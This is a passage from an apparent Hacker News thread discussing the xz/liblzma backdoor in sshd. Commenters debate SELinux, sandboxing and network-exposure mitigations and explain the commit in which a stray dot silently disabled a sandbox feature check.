in by loading into systemd via liblzma. It put on a hook and then sits around waiting for sshd to load in so it can learn the symbols then proceeds to swap in the jumps. sshd is a sitting duck. Bifurcating sshd into a multimodule scheme won't work because some part of it still has to be loaded by systemd. This is a web of trust issue. In the .NET world where refection attacks happen to commercial software that features dynload assemblies, the only solution they could come up with is to sign all the things, then box up anything that doesn't have a signing mechanism and then sign that, even signing plain old zip files. Some day we will all have to have keys, and to keep the anon people from leaving they can get an anon key, but anons with keys will never get on the chain where the big distros would ever trust their commits until someone who forked over their passport and photos got a trustable key to sign off on the commits, so that the distro builders can then greenlight pulling it in. Then I guess to keep the anons hopeful that they are still in the SDLC somewhere their commits can go into the completely untrusted-unstable-crazytown release that no instutution in their right mind would ever lay down in production. | | --- | --- | --- | | | |  |  | [withinboredom](user?id=withinboredom) [9 months ago](item?id=39882703)   | [root](#39877312) | [parent](#39881086) | [next](#39882459) [–]  Do you think state actors won’t just print out random passports? | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39882459)   | [root](#39877312) | [parent](#39881086) | [prev](#39882703) | [next](#39879943) [–]  Anons will just steal identities, and randos will get accused of hacking they didn't do. | | --- | --- | --- | | | |  |  | [semiquaver](user?id=semiquaver) [9 months ago](item?id=39879943)   | [root](#39877312) | [parent](#39879599) | [prev](#39879932) | [next](#39879278) [–]  I’ll admit to not being an expert in SELinux, but it seems like an impossibly leaky proposition. Root can modify systemd startup files, so just do that in a malicious way and reboot the system. *that* context won’t be propagated. And if you somehow prohibit root from doing that by SELinux policy then you end up with a system that can’t actually be administered. [edit: sibling sweetjuly said it better than I could. I doubt that this much more than a fig leaf on any real world system given what sshd is *required* to have to do.] | | --- | --- | --- | | | |  |  | [treasy](user?id=treasy) [9 months ago](item?id=39880106)   | [root](#39877312) | [parent](#39879943) | [next](#39879278) [–]  Selinux domains are uncoupled from Linux users. If sshd does not have Selinux permissions to edit those files it will simply be denied. Even if sshd is run as root | | --- | --- | --- | | | |  |  | [semiquaver](user?id=semiquaver) [9 months ago](item?id=39881930)   | [root](#39877312) | [parent](#39880106) | [next](#39879278) [–]  Which amounts to the un-administerable system I mentioned. If it’s not possible to modify systemd config files using ssh, *what happens when you need to edit them*? | | --- | --- | --- | | | |  |  | [kimixa](user?id=kimixa) [9 months ago](item?id=39882446)   | [root](#39877312) | [parent](#39881930) | [next](#39883868) [–]  Really what they're proposing here is a non-modifiable system, where the root is read-only and no user can modify anything important. Which is nice and all, but that implies a "parent" system that creates and deploys those systems. Which people likely want remote access to.. Probably by sshd... | | --- | --- | --- | | | |  |  | [kbolino](user?id=kbolino) [9 months ago](item?id=39884153)   | [root](#39877312) | [parent](#39882446) | [next](#39883868) [–]  You don't have to have an immutable system. You can limit the exposure of the system from RCE in sshd with SELinux without preventing legitimate users from administering the system. Granted that SELinux is overly complicated and has some questionable design decisions from a usability standpoint but it's not as limited or inflexible as many seem to think. It really can stop a system service running as "root" from doing things a real administrator doesn't want it to do. You can couple it with other mechanisms to achieve defense in depth. While any system is only as strong as its weakest link, you can use SELinux to harden sshd so even with exploits in the wild it's not the weakest link vis-a-vis an attacker getting full unconfined root access. This may or may not be worth your time depending on what that box is doing and how connected to the rest of your infrastructure it is. There seems to be a pervasive misunderstanding of the difference between standard UNIX/Linux discretionary access control and SELinux-style mandatory access control. The latter cannot be fooled into acting as a confused deputy anywhere near as easily as the former. The quality of the SELinux policy on a particular system plays a big part in how effective it is in practice but a good policy will be far harder to circumvent than anything the conventional permissions model is capable of. Moreover, while immutability is obviously an even stronger level of protection, it is not necessary to make the system immutable to accomplish what I've described here while still allowing legitimately and separately authenticated users to fully administer the system. | | --- | --- | --- | | | |  |  | [eto-san](user?id=eto-san) [9 months ago](item?id=39889339)   | [root](#39877312) | [parent](#39884153) | [next](#39884235) [–]  Exactly! Very well done explaning! Most people turn SELinux off anyway, so they have no clue how it operates. DACs (discretionary, unix perms) are DACs and MACs (mandatory, SELinux) are MACs. They are mandatory - it's in their name. Think of SELinux as completely orthogonal access control system, that can overturn any DAC decision, which it in fact does. SELinux language is much more featured than DAC language, it can express domain transitions. Nobody here has inspected the sshd\_t policies but I believe exec transition should be forbidden for arbitrary binaries (I hope). That should in essence thwart arbitrary exec from remote key payload. If actual shellcode would be sent though (e.g. doing filesystem open/write/close), that is a little bit different. | | --- | --- | --- | | | |  |  | [treasy](user?id=treasy) [9 months ago](item?id=39884235)   | [root](#39877312) | [parent](#39884153) | [prev](#39889339) | [next](#39883868) [–]  SELinux is overly complicated, but it’s not hard to at least grasp the basics The amount of people confusing DAC and MAC is concerning. You’ve done an excellent job explaining the topic. | | --- | --- | --- | | | |  |  | [treasy](user?id=treasy) [9 months ago](item?id=39883868)   | [root](#39877312) | [parent](#39881930) | [prev](#39882446) | [next](#39879278) [–]  Those files would be editable by something in the sysadm\_t domain which is by default the domain of the root user after a successful authentication This backdoor does not bypass remote authentication so it should be able to transition to the new domain that has access to these files | | --- | --- | --- | | | |  |  | [ajross](user?id=ajross) [9 months ago](item?id=39879278)   | [root](#39877312) | [parent](#39878918) | [prev](#39879357) | [next](#39878184) [–]  It's possible to spawn a sshd as an unprivileged or partially-capabilitized process. Such as sandbox isn't the default deployment, but it's done often enough and would work as designed to prevent privilege elevation above the sshd process. | | --- | --- | --- | | | |  |  | [admax88qqq](user?id=admax88qqq) [9 months ago](item?id=39879319)   | [root](#39877312) | [parent](#39879278) | [next](#39878184) [–]  How can sshd spawn interactive sessions for other users if it's sandboxed? | | --- | --- | --- | | | |  |  | [kbolino](user?id=kbolino) [9 months ago](item?id=39879489)   | [root](#39877312) | [parent](#39879319) | [next](#39879343) [–]  SELinux does not rely on the usual UID/GID to determine what a process can do. System services, even when running as "root", are running as confined users in SELinux. Confined root cannot do anything which SELinux policy does not allow it to do. This means you can let sshd create new sessions for non-root users while still blocking it from doing the other things which *unconfined* root would be able to do. This is still a lot of power but it's not the godlike access which a person logged in as (unconfined) root has. | | --- | --- | --- | | | |  |  | [quotemstr](user?id=quotemstr) [9 months ago](item?id=39879620)   | [root](#39877312) | [parent](#39879489) | [next](#39879343) [–]  Doesn't matter. A malicious sshd able to run commands arbitrary users can just run malicious commands as those users. We'd need something more like a cryptographically attested setreuid() and execve() combination that would run only commands signed with the private key of the intended user. You'd want to use a shared clock or something to protect against replay attacks | | --- | --- | --- | | | |  |  | [kbolino](user?id=kbolino) [9 months ago](item?id=39879640)   | [root](#39877312) | [parent](#39879620) | [next](#39879343) [–]  Yes, this won't directly protect against an attacker whose goal is to create a botnet, mine some crypto on your dime, etc. However, it will protect against corruption of the O/S itself and, in tandem with other controls, can limit the abilities an attacker has, and ensure things like auditing are still enforced (which can be tied to monitoring, and also used for forensics). Whether it's worth it or not depends on circumstances. In many cloud environments, nuking the VM instance and starting over is probably easier than fiddling with SELinux. | | --- | --- | --- | | | |  |  | [CanaryLayout](user?id=CanaryLayout) [9 months ago](item?id=39881132)   | [root](#39877312) | [parent](#39879640) | [next](#39879343) [–]  even easier is to STOP HOSTING SSHD ON IPV4 ON CLEARNET at minimum, ipv6 only if you absolutely must do it (it absolutely cuts the scans way down) better is to only host it on vpn even better is to only activate it with a portknocker, over vpn even better-better is to set up a private ipv6 peer-to-peer cloud and socat/relay to the private ipv6 network (yggdrasil comes to mind, but there's other solutions to darknet) your sshd you need for server maintenance/scp/git/rsync should never be hosted on ipv4 clearnet where a chinese bot will find it 3 secs after the route is established after boot. | | --- | --- | --- | | | |  |  | [dvdkon](user?id=dvdkon) [9 months ago](item?id=39882245)   | [root](#39877312) | [parent](#39881132) | [next](#39885585) [–]  How about making ssh as secure as (or more secure than) the VPN you'd put it behind? Considering the amount of vulnerabilities in corporate VPNs, I'd even put my money on OpenSSH today. It's not like this is SSH's fault anyway, a supply chain attack could just as well backdoor some Fortinet appliance. | | --- | --- | --- | | | |  |  | [versteegen](user?id=versteegen) [9 months ago](item?id=39884290)   | [root](#39877312) | [parent](#39882245) | [next](#39883084) [–]  Defence in depth. Which of your layers is "more secure" isn't important if none are "perfectly secure", so having an extra (independent) layer such as a VPN is a very good idea. | | --- | --- | --- | | | |  |  | [dvdkon](user?id=dvdkon) [9 months ago](item?id=39891336)   | [root](#39877312) | [parent](#39884290) | [next](#39883084) [–]  You have to decide when to stop stacking, otherwise you'd end up gating access behind multiple VPNs (and actually increasing your susceptibility to hypothetical supply-chain attacks that directly include a RAT). I'd stop at SSH, since I don't see a conceptual difference to how a VPN handles security (unless you also need to internally expose other ports). | | --- | --- | --- | | | |  |  | [formerly\_proven](user?id=formerly_proven) [9 months ago](item?id=39883084)   | [root](#39877312) | [parent](#39882245) | [prev](#39884290) | [next](#39885585) [–]  Honestly the only VPN I'd rank above ssh in terms of internet-worthiness is WireGuard. | | --- | --- | --- | | | |  |  | [xorcist](user?id=xorcist) [9 months ago](item?id=39885585)   | [root](#39877312) | [parent](#39881132) | [prev](#39882245) | [next](#39881765) [–]  OpenSSH has a much smaller attack surface, is thoroughly vetted by the best brains on the planet, and is privilege separated and sandboxed. What VPN software comes even close to that? The only software remotely in the same league is a stripped down Wireguard. There is a reason the attacker decided to attack liblzma instead of OpenSSH. | | --- | --- | --- | | | |  |  | [alrs](user?id=alrs) [9 months ago](item?id=39881765)   | [root](#39877312) | [parent](#39881132) | [prev](#39885585) | [next](#39887525) [–]  Who cares about scans? Who cares if a scan comes in 4 or 6? | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39942771)   | [root](#39877312) | [parent](#39881765) | [next](#39884197) [–]  I imagine it stops some non-targeted attempts that simply probe the entire v4 range, which is not feasible with v6. But yeah, not really buying you much, especially if there is any publicly listed service on that IP. | | --- | --- | --- | | | |  |  | [kbolino](user?id=kbolino) [9 months ago](item?id=39884197)   | [root](#39877312) | [parent](#39881765) | [prev](#39942771) | [next](#39887525) [–]  Forget IPv6, just moving SSH off of port 22 stops the vast majority of drive-by attacks against sshd on the open Internet. | | --- | --- | --- | | | |  |  | [eklitzke](user?id=eklitzke) [9 months ago](item?id=39887525)   | [root](#39877312) | [parent](#39881132) | [prev](#39881765) | [next](#39879343) [–]  This is a joke right? If you have password authentication disabled then it shouldn't matter how many thousands of times a day people are scanning and probing sshd. Port knockers, fail2ban, and things of that nature are just security by obscurity that don't materially increase your security posture. If sshd is written correctly and securely it doesn't matter if people are trying to probe your system, if it's not written correctly and securely you're SOL no matter what. | | --- | --- | --- | | | |  |  | [eto-san](user?id=eto-san) [9 months ago](item?id=39889355)   | [root](#39877312) | [parent](#39887525) | [next](#39879343) [–]  But ssh is written correctly. Now that other thing isn't. :D I fail to see a problem here. | | --- | --- | --- | | | |  |  | [ajross](user?id=ajross) [9 months ago](item?id=39879343)   | [root](#39877312) | [parent](#39879319) | [prev](#39879489) | [next](#39878184) [–]  Plausibly by having set-user-ID capability but not others an attacker might need. But in the more common case it just doesn't: you have an sshd running on a dedicated port for the sole purpose of running some service or another under a specific sandboxed UID. That's basically the github business model, for example. | | --- | --- | --- | | | |  |  | [dotancohen](user?id=dotancohen) [9 months ago](item?id=39882888)   | [root](#39877312) | [parent](#39879343) | [next](#39878184) [–]  I need full filesystem access, VIM, ls, cd, grep, awk, df, du at the very least. Sometimes perl, find, ncdu, and other utilities are necessary as well. Are you suggesting that each tool have its own SSH process wrapping it? Maybe write a shell to coordinate between them? It should support piping and output redirection, please. | | --- | --- | --- | | | |  |  | [ajross](user?id=ajross) [9 months ago](item?id=39884000)   | [root](#39877312) | [parent](#39882888) | [next](#39878184) [–]  Sigh. I'm not saying there's a sandboxed sshd setup that has equivalent functionality to the default one in your distro. I'm not even saying that there's one appropriate for your app. I'm saying, as a response to the point above, that sandboxing sshd is absolutely a valid defense-in-depth technique for privilege isolation, that it would work against attacks like this one to prevent whole-system exploitation, and that it's very commonly deployed in practice (c.f. running a git/ssh server a-la github). | | --- | --- | --- | | | |  |  | [semiquaver](user?id=semiquaver) [9 months ago](item?id=39884704)   | [root](#39877312) | [parent](#39884000) | [next](#39885576) [–]  Git’s use of the ssh protocol as a transport is a niche use case that ignores the actual problem. No one is seriously arguing that you can’t sandbox that constrained scenario but it’s not really relevant since it’s not the main purpose of the secure *shell* daemon. | | --- | --- | --- | | | |  |  | [dotancohen](user?id=dotancohen) [9 months ago](item?id=39885576)   | [root](#39877312) | [parent](#39884000) | [prev](#39884704) | [next](#39878184) [–]  The focus on the first S is good, yes, but SSH has another S and an H that needs focus as well. | | --- | --- | --- | | | |  |  | [onedognight](user?id=onedognight) [9 months ago](item?id=39878184)   | [root](#39877312) | [parent](#39877773) | [prev](#39878918) | [next](#39880304) [–]  > With the right sandboxing techniques, SELinux and mitigations could prevent the attacker from doing anything with root permissions. Please review this commit[0] where the sandbox detection was “improved”. [0] [https://git.tukaani.org/?p=xz.git;a=commitdiff;h=328c52da8a2...](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=328c52da8a2bbb81307644efdb58db2c422d9ba7) | | --- | --- | --- | | | |  |  | [dolmen](user?id=dolmen) [9 months ago](item?id=39879156)   | [root](#39877312) | [parent](#39878184) | [next](#39878442) [–]  I can't blame anyone who has missed that dot dissimulated at the beginning of the line. [https://git.tukaani.org/?p=xz.git;a=commitdiff;h=f9cf4c05edd...](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=f9cf4c05edd14dedfe63833f8ccbe41b55823b00) | | --- | --- | --- | | | |  |  | [Muromec](user?id=Muromec) [9 months ago](item?id=39879248)   | [root](#39877312) | [parent](#39879156) | [next](#39879317) [–]  I specifically opened this diff to search for a sneaky dot, knowing it’s there, and wasn’t able to find it until I checked the revert patch | | --- | --- | --- | | | |  |  | [Aquilla\_](user?id=Aquilla_) [9 months ago](item?id=39885849)   | [root](#39877312) | [parent](#39879248) | [next](#39879317) [–]  Same, I knew a sneaky dot was in the diff but had to ctrl-f the diff to find it. | | --- | --- | --- | | | |  |  | [gouggoug](user?id=gouggoug) [9 months ago](item?id=39879317)   | [root](#39877312) | [parent](#39879156) | [prev](#39879248) | [next](#39878442) [–]  For people like me whose C knowledge is poor, can you explain why this dot is significant? What does it do in actuality? | | --- | --- | --- | | | |  |  | [Denvercoder9](user?id=Denvercoder9) [9 months ago](item?id=39879350)   | [root](#39877312) | [parent](#39879317) | [next](#39879411) [–]  It's part of a test program used for feature detection (of a sandboxing functionality), and causes a syntax error. That in turn causes the test program to fail to compile, which makes the configure script assume that the sandboxing function is unavailable, and disables support for it. | | --- | --- | --- | | | |  |  | [loumf](user?id=loumf) [9 months ago](item?id=39879411)   | [root](#39877312) | [parent](#39879317) | [prev](#39879350) | [next](#39879348) [–]  You are looking at a makefile, not C. The C code is in a string that is being passed to a function called `check\_c\_source\_compiles()`, and this dot makes that code not compile when it should have -- which sets a boolean incorrectly, which presumably makes the build do something it should not do. | | --- | --- | --- | | | |  |  | [nurple](user?id=nurple) [9 months ago](item?id=39879907)   | [root](#39877312) | [parent](#39879411) | [next](#39881535) [–]  Interesting that validating the failure reason of an autotools compile check could be a security mitigation... | | --- | --- | --- | | | |  |  | [paulmd](user?id=paulmd) [9 months ago](item?id=39882222)   | [root](#39877312) | [parent](#39879907) | [next](#39885324) [–]  This is something that should have unit/integration tests inside the tooling itself, yeah. If your assertion is that X function is called / in the environment X then the function should return Y then that should be a test especially when it’s load-bearing for security. And tooling is no exception either. You should have tests that your tooling does the things it says on the tin and that things happen when flags are set and things don’t happen when they’re not set, and that the tooling sets the flags in the way you expect. These aren’t even controversial statements in the JVM world etc. Just C tooling is largely still living in the 70s apart from abortive attempts to build the jenga tower even taller like autotools/autoconf/cmake/etc (incomprehensible, may god have mercy on your build). At least hand written make files are comprehensible tbh. | | --- | --- | --- | | | |  |  | [yencabulator](user?id=yencabulator) [9 months ago](item?id=39885331)   | [root](#39877312) | [parent](#39882222) | [next](#39885324) [–]  It's a "does this compile on this platform" test, not a "does this function return what we expect" test. | | --- | --- | --- | | | |  |  | [yencabulator](user?id=yencabulator) [9 months ago](item?id=39885324)   | [root](#39877312) | [parent](#39879907) | [prev](#39882222) | [next](#39881535) [–]  Unfortunately in the world of autoconf and multiple platforms and compilers, there was no standard way to understand why the compilation failed. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39881535)   | [root](#39877312) | [parent](#39879411) | [prev](#39879907) | [next](#39879348) [–]  Cmake actually but yes | | --- | --- | --- | | | |  |  | [ezekg](user?id=ezekg) [9 months ago](item?id=39879348)   | [root](#39877312) | [parent](#39879317) | [prev](#39879411) | [next](#39878442) [–]  As far as I can tell, the check is to see if a certain program compiles, and if so, disable something. The dot makes it so that it always fails to compile and thus always disables that something. | | --- | --- | --- | | | |  |  | [\_nalply](user?id=_nalply) [9 months ago](item?id=39882695)   | [root](#39877312) | [parent](#39879348) | [next](#39878442) [–]  > if a certain program compiles, and if so, disable something. Tiny correction: [...] enable something. The idea is: If that certain program does not compile it is because something is not available on the system and therefore needs to be disabled. That dot undermines that logic. The program fails because of a syntax error caused by the dot and not because something is missing. It is easy to overlook because that dot is tiny and there are many such tests. I had a similar problem with unit testing of a library. Expected failures need to be tested as well. As an example imagine writing a matrix inversion library. Then you need to verify that you get something like a division by zero error if you invert the zero matrix. You write a unit test for that and by mistake you insert a syntax error. Then you run the unit test and it fails as expected but not in the correct way. It's subtle. It fails as expected but it fails because of unexpected wrong causes. The solution: Check the errors carefully! | | --- | --- | --- | | | |  |  | [yencabulator](user?id=yencabulator) [9 months ago](item?id=39885350)   | [root](#39877312) | [parent](#39882695) | [next](#39878442) [–]  > The solution: Check the errors carefully! The desire for "does this compile on this platform" checks comes from an era where there was pretty much no way to check the error. Somebody runs it on HP-UX with the "HP-UX Ansi C Compiler" they licensed from HP and the error it spits out isn't going to look like anything you recognize. | | --- | --- | --- | | | |  |  | [Denvercoder9](user?id=Denvercoder9) [9 months ago](item?id=39878442)   | [root](#39877312) | [parent](#39878184) | [prev](#39879156) | [next](#39881343) [–]  That one's a separate attack vector, which is seemingly unused in the sshd attack. It only disables sandboxing of the xzdec(2) utility, which is not used in the sshd attack. | | --- | --- | --- | | | |  |  | [formerly\_proven](user?id=formerly_proven) [9 months ago](item?id=39879237)   | [root](#39877312) | [parent](#39878442) | [next](#39881343) [–]  Which strongly suggests that they planned and/or executed more backdoors via Jia Tan’s access. | | --- | --- | --- | | | |  |  | [pja](user?id=pja) [9 months ago](item?id=39879382)   | [root](#39877312) | [parent](#39879237) | [next](#39881343) [–]  I guess xzdec was supposed to sandbox itself where possible so they disabled the sandbox feature check in the build system so that future payload exploits passed to xzdec wouldn’t have to escape the sandbox in order to do anything useful? Sneaky. | | --- | --- | --- | | | |  |  | [db48x](user?id=db48x) [9 months ago](item?id=39881343)   | [root](#39877312) | [parent](#39878184) | [prev](#39878442) | [next](#39878789) [–]  Yes, but don't forget that there are different kinds of sandboxes. SELinux never needs the cooperation of any program running on the system in order to correctly sandbox things. No change to Xz could ever make SELinux less effective. | | --- | --- | --- | | | |  |  | [ynik](user?id=ynik) [9 months ago](item?id=39883386)   | [root](#39877312) | [parent](#39881343) | [next](#39878789) [–]  But don't forget that xz is also used as part of dpkg for unpacking packages. The whole purpose of dpkg is to update critical system packages. Any SELinux policy that protects from a backdoored dpkg/xz installing a rootkit during the next kernel security update; will also prevent installing real kernel security updates. The particular way of attack in this OpenSSH backdoor can maybe be prevented; but we've got to realize that the attacker already had full root permissions and there's no way of protecting from that. | | --- | --- | --- | | | |  |  | [db48x](user?id=db48x) [9 months ago](item?id=39885712)   | [root](#39877312) | [parent](#39883386) | [next](#39878789) [–]  SELinux policies are much more subtle than that. You don’t restrict what xz or liblzma can do, you restrict what the whole process can do. That process is either sshd or dpkg, and you can give them completely different access to the system, so that if dpkg tries to launch an interactive shell it fails, while sshd fails if it tries to overwrite a system file such as /bin/login or whatever. Neither would ordinarily do that, but the payload delivered via the back door might attempt it and wouldn’t succeed. And you would get a report stating what had happened, so if you’re paying attention the back door starts to become obvious. Also I think dpkg switched to Zstd, didn’t it? Or am I misremembering? But you’re not wrong; ultimately both sshd and dpkg are critical infrastructure. SELinux can prevent them from doing completely wrong things, but obviously it wouldn’t be useful for it to prevent them from doing their jobs. And those jobs are security critical already. SELinux is not a panacea, merely defense in depth. | | --- | --- | --- | | | |  |  | [glandium](user?id=glandium) [9 months ago](item?id=39878789)   | [root](#39877312) | [parent](#39878184) | [prev](#39881343) | [next](#39878218) [–]  Oh, that one is interesting, because it only breaks it in cmake. | | --- | --- | --- | | | |  |  | [sn](user?id=sn) [9 months ago](item?id=39879182)   | [root](#39877312) | [parent](#39878789) | [next](#39878218) [–]  I wonder if there is anything else cmake related that should be looked at. Wasn't cmake support originally added to xz to use with Windows and MSVC? | | --- | --- | --- | | | |  |  | [glandium](user?id=glandium) [9 months ago](item?id=39879354)   | [root](#39877312) | [parent](#39879182) | [next](#39878218) [–]  But that's a check for a Linux feature. So the more interesting question would be, what in the Linux world might be building xz-utils with cmake, I guess using ExternalProject\_Add or something similar. | | --- | --- | --- | | | |  |  | [sn](user?id=sn) [9 months ago](item?id=39879760)   | [root](#39877312) | [parent](#39879354) | [next](#39878218) [–]  Yes this is Linux. At this time we don't know exactly how much is affected and what originally drew the attention of the attacker(s). | | --- | --- | --- | | | |  |  | [ronsor](user?id=ronsor) [9 months ago](item?id=39878218)   | [root](#39877312) | [parent](#39878184) | [prev](#39878789) | [next](#39880304) [–]  Well, the definition of "improve" depends on one's goals. | | --- | --- | --- | | | |  |  | [dhx](user?id=dhx) [9 months ago](item?id=39880304)   | [root](#39877312) | [parent](#39877773) | [prev](#39878184) | [next](#39879598) [–]  sshd is probably the softest target on most systems. It is generally expected (and setup by default) so that people can gain a root shell that provides unrestricted access. sshd.service will typically score 9.6/10 for "systemd-analyze security sshd.service" where 10 is the worst score. When systemd starts a process, it does so by using systemd-nspawn to setup a (usually) restricted namespace and apply seccomp filters before the process is then executed. seccomp filters are inherited by child processes, which can then only further restrict privileges but not expand upon the inherited privileges. openssh-portable on Linux does apply seccomp filters to child processes but this is useless in this attack scenario because sshd is backdoored by the xz library, and the backdoored library can just disable/change those seccomp filters before sshd is executed. sshd is particularly challenging to sandbox because if you were to restrict the namespace and apply strict seccomp filters via systemd-nspawn, a user gaining a root shell via sshd (or wanting to sudo/su as root) is then perhaps prevented from remotely debugging applications, accessing certain filesystems, interacting with network interfaces, etc depending on what level of sandboxing is applied from systemd-nspawn. This choice is highly user dependent and there are probably only limited sane defaults for someone who has already decided they want to use sshd. For example, sane defaults could include creating dedicated services with sandboxing tailored just for read-only sftp user filesystem access, a separate service for read/write sftp user filesystem access, sshd tunneling, unprivileged remote shell access, etc. | | --- | --- | --- | | | |  |  | [nottorp](user?id=nottorp) [9 months ago](item?id=39882361)   | [root](#39877312) | [parent](#39880304) | [next](#39879598) [–]  So for all practical purposes you can't sandbox ssh on a developer's machine much. | | --- | --- | --- | | | |  |  | [quotemstr](user?id=quotemstr) [9 months ago](item?id=39879598)   | [root](#39877312) | [parent](#39877773) | [prev](#39880304) | [next](#39877797) [–]  Doesn't matter. This is a supply chain attack, not a vulnerability arising from a bug. All sandboxing the certificate parsing code would have done is make the author of the backdoor do a little bit more work to hijack the necessarily un-sandboxed supervisor process. Applying the usual exploit mitigations to supply chain attacks won't do much good. What will? Kill distribution tarballs. Make every binary bit for bit reproducible from a known git hash. Minimize dependencies. Run whole programs with minimal privileges. Oh, and finally support SHA2 in git to forever forestall some kind of preimage attack against a git commit hash. | | --- | --- | --- | | | |  |  | [nurple](user?id=nurple) [9 months ago](item?id=39879928)   | [root](#39877312) | [parent](#39879598) | [next](#39887817) [–]  Oh boy, do I have the packaging system for you! | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39887817)   | [root](#39877312) | [parent](#39879598) | [prev](#39879928) | [next](#39888473) [–]  Malware can be in commits as well… | | --- | --- | --- | | | |  |  | [quotemstr](user?id=quotemstr) [9 months ago](item?id=39893448)   | [root](#39877312) | [parent](#39887817) | [next](#39888473) [–]  But it's harder to hide there | | --- | --- | --- | | | |  |  | [LtWorf](user?id=LtWorf) [9 months ago](item?id=39910031)   | [root](#39877312) | [parent](#39893448) | [next](#39888473) [–]  Just do a "fix style" that deletes and re-addds every line- | | --- | --- | --- | | | |  |  | [int\_19h](user?id=int_19h) [9 months ago](item?id=39888473)   | [root](#39877312) | [parent](#39879598) | [prev](#39887817) | [next](#39877797) [–]  ... and stop adding random patches to upstream software, especially when we're talking about security-critical stuff that must absolutely not be released without a very thorough security review. | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39877797)   | [root](#39877312) | [parent](#39877773) | [prev](#39879598) | [next](#39879923) [–]  Right, though if I'm understanding correctly, this is targeting openssl, not just sshd. So there's a larger set of circumstances where this could have been exploited. I'm not sure if it's yet been confirmed that this is confined only to sshd. | | --- | --- | --- | | | |  |  | [jeroenhd](user?id=jeroenhd) [9 months ago](item?id=39877845)   | [root](#39877312) | [parent](#39877797) | [next](#39879923) [–]  The exploit, as currently found, seems to target OpenSSH specifically. It's possible that everything involving xz has been compromised, but I haven't read any reports that there is a path to malware execution outside of OpenSSH. A quote from the first analysis that I know of (<https://www.openwall.com/lists/oss-security/2024/03/29/4>): > Initially starting sshd outside of systemd did not show the slowdown, despite the backdoor briefly getting invoked. This appears to be part of some countermeasures to make analysis harder. > a) TERM environment variable is not set > b) argv[0] needs to be /usr/sbin/sshd > c) LD\_DEBUG, LD\_PROFILE are not set > d) LANG needs to be set > e) Some debugging environments, like rr, appear to be detected. Plain gdb appears to be detected in some situations, but not others | | --- | --- | --- | | | |  |  | [cryptonector](user?id=cryptonector) [9 months ago](item?id=39879923)   | [root](#39877312) | [parent](#39877773) | [prev](#39877797) | [next](#39878522) [–]  This is what PrivSep was supposed to do. sshd could fork an unprivileged and restricted process to do the signature validation, I suppose. | | --- | --- | --- | | | |  |  | [hellcow](user?id=hellcow) [9 months ago](item?id=39878522)   | [root](#39877312) | [parent](#39877773) | [prev](#39879923) | [next](#39879674) [–]  Another reason to adopt OpenBSD style pledge/unveil in Linux. | | --- | --- | --- | | | |  |  | [somat](user?id=somat) [9 months ago](item?id=39879067)   | [root](#39877312) | [parent](#39878522) | [next](#39892065) [–]  Would that help? sshd, by design, opens shells. the backdoor payload was basically to open a shell. that is, the very thing that sshd has to do. The pledge/unvail system is pretty great, but my understanding is that it do not do anything that the linux equivalent interfaces(seccomp i think) cannot do. It is just a simplified/saner interface to the same problem of "how can a program notify the kernel what it's scope is?" The main advantage to pledge/unveil bring to the table is that they are easy to use and cannot be turned off, optional security isn't. | | --- | --- | --- | | | |  |  | [jeroenhd](user?id=jeroenhd) [9 months ago](item?id=39892065)   | [root](#39877312) | [parent](#39878522) | [prev](#39879067) | [next](#39879674) [–]  By design, OpenSSH will start an interactive shell with either the capabilities to escalate to root or direct root permissions. I don't think pledge/unveil will work any better than seccomp already does. I do like the pledge/unveil API, but I don't think it would've made much of a difference. | | --- | --- | --- | | | |  |  | [tootie](user?id=tootie) [9 months ago](item?id=39879674)   | [parent](#39877312) | [prev](#39877773) | [next](#39878872) [–]  Mind boggling. How do you even decide what to do with privileges on a billion computers? | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39879784)   | [root](#39877312) | [parent](#39879674) | [next](#39883279) [–]  There's a reasonably high chance this was to target a specific machine, or perhaps a specific organization's set of machines. After that it could probably be sold off once whatever they were using it for was finished. I doubt we'll ever know the intention unless the ABC's throw us a bone and tell us the results of their investigation (assuming they're not the ones behind it). | | --- | --- | --- | | | |  |  | [cmcaleer](user?id=cmcaleer) [9 months ago](item?id=39882825)   | [root](#39877312) | [parent](#39879784) | [next](#39882728) [–]  Classic example of this being Stuxnet, a worm that exploited four(!) different 0-days and infected hundreds of thousands of computers with the ultimate goal of destroying centrifuges associated with Iran’s nuclear program. | | --- | --- | --- | | | |  |  | [ddalex](user?id=ddalex) [9 months ago](item?id=39882728)   | [root](#39877312) | [parent](#39879784) | [prev](#39882825) | [next](#39882670) [–]  I'd disagree, based on reports of the actor trying to get this upstreamed in Debian and Fedora. Widespread net. | | --- | --- | --- | | | |  |  | [BbzzbB](user?id=BbzzbB) [9 months ago](item?id=39882670)   | [root](#39877312) | [parent](#39879784) | [prev](#39882728) | [next](#39883279) [–]  ABC? | | --- | --- | --- | | | |  |  | [tau255](user?id=tau255) [9 months ago](item?id=39882690)   | [root](#39877312) | [parent](#39882670) | [next](#39882751) [–]  3 letter intelligence agencies. | | --- | --- | --- | | | |  |  | [aaronmdjones](user?id=aaronmdjones) [9 months ago](item?id=39882761)   | [root](#39877312) | [parent](#39882690) | [next](#39882751) [–]  Baw, GCHQ is going to feel so left out. | | --- | --- | --- | | | |  |  | [az226](user?id=az226) [9 months ago](item?id=39882751)   | [root](#39877312) | [parent](#39882670) | [prev](#39882690) | [next](#39883279) [–]  NSA, CIA, FBI, DHS. | | --- | --- | --- | | | |  |  | [goalieca](user?id=goalieca) [9 months ago](item?id=39883279)   | [root](#39877312) | [parent](#39879674) | [prev](#39879784) | [next](#39882074) [–]  Government organizations have many different teams. One might develop vulnerabilities while another runs operations with oversight for approving use of exploits and picking targets. Think bureaucracy with different project teams and some multi-layered management coordinating strategy at some level. | | --- | --- | --- | | | |  |  | [kortilla](user?id=kortilla) [9 months ago](item?id=39882074)   | [root](#39877312) | [parent](#39879674) | [prev](#39883279) | [next](#39878872) [–]  There aren’t a billion computers running ssh servers and the ones that do should not be exposed to the general internet. This is a stark reminder of why defense in depth matters. | | --- | --- | --- | | | |  |  | [sega\_sai](user?id=sega_sai) [9 months ago](item?id=39878872)   | [prev](#39877312) | [next](#39881018) [–]  One have question on this is, if the backdoor would not been discovered due to performance issue (which was as 